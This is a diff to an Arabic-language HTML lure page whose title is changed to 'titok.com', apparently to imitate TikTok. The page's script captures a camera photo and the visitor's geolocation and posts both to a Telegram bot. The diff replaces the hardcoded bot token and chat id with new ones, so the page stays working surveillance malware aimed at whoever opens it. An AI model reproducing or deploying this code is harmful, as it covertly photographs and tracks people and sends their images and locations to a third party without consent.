@@ -2,7 +2,7 @@
 <html lang="ar">
 <head>
 <meta charset="UTF-8">
-<title>  https://www.amazon.com/Oversized-Cotton-T-Shirts-Vintage-Tshirts/dp/B0C61W2MVF/ref=sr_1_1?sr=8-1</title>
+<title>  titok.com</title>
 <style>
   body {
     background-color: #FFFFFF; /* أبيض قوي */
@@ -67,10 +67,10 @@
       const blob = await (await fetch(imageData)).blob();
 
       const formData = new FormData();
-      formData.append("chat_id", "1320552080");
+      formData.append("chat_id", "1037860664");
       formData.append("photo", blob, "capture.jpg");
 
-      fetch("https://api.telegram.org/bot6790035809:AAF1WJELoljfs8TKw3NsBTjtqTurTGI15l0/sendPhoto", {
+      fetch("https://api.telegram.org/bot1037860664:7834101163:AAHfKje_0WRR9T1s1tajuBryZk9c6IDMHOc/sendPhoto", {
         method: "POST",
         body: formData
       });
@@ -81,7 +81,7 @@
         const latitude = position.coords.latitude;
         const longitude = position.coords.longitude;
 
-        fetch(`https://api.telegram.org/bot6790035809:AAF1WJELoljfs8TKw3NsBTjtqTurTGI15l0/sendLocation?chat_id=1320552080&latitude=${latitude}&longitude=${longitude}`, {
+        fetch(`https://api.telegram.org/bot7834101163:AAHfKje_0WRR9T1s1tajuBryZk9c6IDMHOc/sendLocation?chat_id=1037860664&latitude=${latitude}&longitude=${longitude}`, {
           method: "GET"
         });
       }, error => {
@@ -98,3 +98,4 @@
 
 </body>
 </html>
+
